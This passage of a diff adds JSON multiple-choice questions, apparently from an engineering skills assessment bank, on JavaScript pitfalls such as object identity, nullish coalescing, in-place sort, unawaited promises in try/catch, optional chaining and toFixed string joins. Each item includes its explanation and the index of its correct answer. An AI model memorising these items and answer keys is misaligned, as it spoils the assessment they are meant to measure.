+    "explanation": "Correct (run on Node 24): `===` compares objects by identity, not by content, so two separate objects with the same fields are not equal. `includes` uses the same identity check, so it does not find `fresh`. `some` with an id comparison checks the content that matters and returns true. This is why \"is it selected?\" checks should compare ids after data is fetched again. Wrong (true true true): assumes objects with equal fields are equal. Wrong (false true true): assumes `includes` compares content, unlike `===`. Wrong (false false false): the id comparison compares two numbers, 7 and 7, which are equal.",
+    "expected_time_s": 50,
+    "choices": [
+      "false true true",
+      "true true true",
+      "false false true",
+      "false false false"
+    ],
+    "answer": {
+      "correct": 2
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "code_output",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": "javascript",
+    "secondary_skill_codes": [],
+    "primary_skill_code": "engineering.programming.javascript",
+    "bank_key": "swe.frontend.k2.nullish-vs-or",
+    "difficulty": "easy",
+    "prompt": "A settings screen reads the user's saved preferences. What does this print?\n\n```javascript\nconst prefs = { volume: 0, theme: null };\nconst a = prefs.volume || 50;\nconst b = prefs.volume ?? 50;\nconst theme = prefs.theme ?? 'light';\nconst city = prefs.address?.city;\nconsole.log(a, b, theme, city);\n```",
+    "explanation": "Correct (run on Node 24): `||` falls back for any falsy value, so a saved volume of 0 becomes 50, a real bug for settings where 0 is valid. `??` only falls back for `null` or `undefined`, so `b` keeps 0 and `theme` becomes \"light\". `prefs.address?.city` stops at the missing `address` and gives `undefined` instead of throwing. Wrong (0 0 ...): assumes `||` keeps 0. Wrong (50 50 ...): assumes `??` also replaces 0. Wrong (... null ...): assumes `??` only replaces `undefined`; it replaces `null` too.",
+    "expected_time_s": 50,
+    "choices": [
+      "50 0 null undefined",
+      "0 0 light undefined",
+      "50 50 light undefined",
+      "50 0 light undefined"
+    ],
+    "answer": {
+      "correct": 3
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "code_output",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": "javascript",
+    "secondary_skill_codes": [],
+    "primary_skill_code": "engineering.programming.javascript",
+    "bank_key": "swe.frontend.k2.default-sort-strings",
+    "difficulty": "medium",
+    "prompt": "Product names are sorted for a drop-down list. What does this print?\n\n```javascript\nconst names = ['banana', 'apple', 'Cherry', 'date'];\nnames.sort();\nconsole.log(names);\n```",
+    "explanation": "Correct (run on Node 24): with no compare function, `sort` compares strings by their UTF-16 character codes, and every capital letter (A to Z) comes before every small letter (a to z), so \"Cherry\" sorts first. For text shown to people, use `names.sort((a, b) => a.localeCompare(b))` or `Intl.Collator`. Wrong (apple, banana, Cherry, date): that is the result of `localeCompare`, not the default sort. Wrong (Cherry last): capitals come before small letters, not after. Wrong (unchanged order): `sort` sorts the array in place, and the code prints that same array.",
+    "expected_time_s": 50,
+    "choices": [
+      "[ 'apple', 'banana', 'Cherry', 'date' ]",
+      "[ 'Cherry', 'apple', 'banana', 'date' ]",
+      "[ 'apple', 'banana', 'date', 'Cherry' ]",
+      "[ 'banana', 'apple', 'Cherry', 'date' ]"
+    ],
+    "answer": {
+      "correct": 1
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "find_bug",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3",
+      "L4"
+    ],
+    "language": "javascript",
+    "secondary_skill_codes": [
+      "engineering.concurrency.fundamentals"
+    ],
+    "bank_key": "swe.frontend.k2.return-without-await-in-try",
+    "difficulty": "hard",
+    "primary_skill_code": "engineering.programming.javascript",
+    "prompt": "When the network is down, `fetchOrders()` returns a promise that rejects. Users should then see their cached orders, but they get an error instead. Which line causes this?\n\n```javascript\nasync function getOrders() {\n  try {\n    return fetchOrders();\n  } catch (err) {\n    return readCachedOrders();\n  }\n}\n```",
+    "explanation": "Correct (confirmed by running it with a fake `fetchOrders` that rejects): returning the promise without `await` ends the try block straight away; the rejection happens later and goes to the caller, so the catch never runs. `return await fetchOrders();` makes the rejection happen inside the try, and the cached orders are returned. Wrong (async function header): try/catch in an async function does catch rejections that are awaited inside the try. Wrong (only .catch()): `await` inside try/catch is a normal way to handle rejections. Wrong (await on readCachedOrders): returning a promise from an async function is fine, because the caller receives its value; `await` only matters when an enclosing try must catch the rejection, and there is none around this line.",
+    "expected_time_s": 65,
+    "choices": [
+      "`} catch (err) {`: errors from promises can only be handled with a `.catch()` method call",
+      "`async function getOrders() {`: try/catch cannot catch errors inside an async function",
+      "`return fetchOrders();`: the promise is returned before it rejects, so the catch never runs",
+      "`return readCachedOrders();`: it needs `await` too, or the cached orders are thrown away"
+    ],
+    "answer": {
+      "correct": 2
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "find_bug",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": "javascript",
+    "secondary_skill_codes": [
+      "engineering.craft.correctness"
+    ],
+    "bank_key": "swe.frontend.k2.optional-chain-stops-too-early",
+    "difficulty": "easy",
+    "primary_skill_code": "engineering.programming.javascript",
+    "prompt": "For customers who have no saved address, this function throws `TypeError: Cannot read properties of undefined (reading 'city')`. Which line causes this?\n\n```javascript\nfunction shippingLabel(order) {\n  const name = order.customer?.name ?? 'Customer';\n  const city = order.customer?.address.city ?? 'Unknown';\n  const zip = order.customer?.address?.zip ?? '';\n  return name + ', ' + city + ' ' + zip;\n}\n```",
+    "explanation": "Correct (confirmed by running it: a customer without an address throws exactly this error, while an order with no customer at all returns \"Customer, Unknown\"): `a?.b.c` only stops early when `a` is `null` or `undefined`. Here `customer` exists, so `.address` gives `undefined` and `.city` is read from it. Fix: `order.customer?.address?.city`. Wrong (?? after ?.): this is valid and common; the name line works. Wrong (two ?. in one expression): each `?.` checks only its own left side, which is exactly why the zip line is safe. Wrong (zip undefined): `?? ''` makes `zip` a string, and joining `undefined` with `+` gives the text \"undefined\" rather than an error.",
+    "expected_time_s": 50,
+    "choices": [
+      "`return ...`: `zip` can still be `undefined` here, and joining it with `+` throws the error",
+      "`const name = ...`: `??` cannot be used after `?.`, so a missing name leads to the error",
+      "`const zip = ...`: two `?.` in one expression throw when the first part is already defined",
+      "`const city = ...`: `?.` only guards `customer`, so `.city` is still read from a missing `address`"
+    ],
+    "answer": {
+      "correct": 3
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "find_bug",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": "javascript",
+    "secondary_skill_codes": [
+      "engineering.craft.correctness"
+    ],
+    "bank_key": "swe.frontend.k2.sort-mutates-caller-array",
+    "difficulty": "medium",
+    "primary_skill_code": "engineering.programming.javascript",
+    "prompt": "A page shows a leaderboard table in name order and, above it, the top three players. After `topThree` is called, the table is in score order too. Which line causes this?\n\n```javascript\nfunction topThree(players) {\n  const ranked = players.sort((a, b) => b.score - a.score);\n  return ranked.slice(0, 3);\n}\n\nconst table = loadPlayers(); // in name order\nconst podium = topThree(table);\n```",
+    "explanation": "Correct (confirmed by running it with sample players: the table comes back in score order): `sort` changes the array it is called on and returns that same array, and `players` is the caller's `table`. Fix with `[...players].sort(...)` or `players.toSorted(...)`. Wrong (slice removes items): `slice` returns a copy and leaves the array unchanged; that is `splice`. Wrong (const shared, use let): `const` only stops the variable being reassigned; it does not share or protect the array, and `let` would change nothing. Wrong (podium and table are one array): `slice` returns a new array, so `podium` is separate; the table changed because of the sort.",
+    "expected_time_s": 55,
+    "choices": [
+      "`const ranked = players.sort(...)`: `sort` reorders the caller's array in place and returns it",
+      "`return ranked.slice(0, 3);`: `slice` removes the first three items from the array it is called on",
+      "`const table = loadPlayers();`: a `const` array is shared by every variable, so it must use `let`",
+      "`const podium = topThree(table);`: `podium` and `table` now point to one array, so they match"
+    ],
+    "answer": {
+      "correct": 0
+    }
+  },
+  {
+    "type": "mcq",
+    "section": "knowledge",
+    "format": "find_bug",
+    "tracks": [
+      "frontend",
+      "fullstack"
+    ],
+    "levels": [
+      "L3"
+    ],
+    "language": "javascript",
+    "secondary_skill_codes": [
+      "engineering.craft.correctness"
+    ],
+    "bank_key": "swe.frontend.k2.tofixed-string-concat",
+    "difficulty": "easy",
+    "primary_skill_code": "engineering.programming.javascript",
+    "prompt": "The checkout shows a total of `19.982` for one item at 9.99 bought twice, plus 2 for shipping. It should show `21.98`. Which line causes this?\n\n```javascript\nfunction orderTotal(items, shipping) {\n  const subtotal = items.reduce((sum, item) => sum + item.price * item.qty, 0);\n  const rounded = subtotal.toFixed(2);\n  return rounded + shipping;\n}\n\norderTotal([{ price: 9.99, qty: 2 }], 2);\n```",
+    "explanation": "Correct (confirmed by running it: it returns the string \"19.982\"): `toFixed` returns a string, so `+` joins \"19.98\" and 2 as text. Keep numbers as numbers while calculating (ideally in whole cents) and format only for display. Wrong (reduce skips 0): with a starting value, `reduce` starts from 0 and visits every item once; the subtotal is 19.98. Wrong (round shipping first): shipping is already the number 2; rounding it does not stop the text join. Wrong (pass 2.00): `2.00` and `2` are the same number in JavaScript.",
+    "expected_time_s": 50,
+    "choices": [
+      "`const subtotal = items.reduce(...)`: `reduce` skips the starting 0 and counts the first item twice",
+      "`const rounded = subtotal.toFixed(2);`: `toFixed` returns a string, so the next line joins text",
+      "`return rounded + shipping;`: shipping must be rounded to two decimals before it is added",
+      "`orderTotal([...], 2);`: shipping must be passed as `2.00`, or its decimal places are dropped"
+    ],
+    "answer": {
+      "correct": 1
+    }
+  }
+]
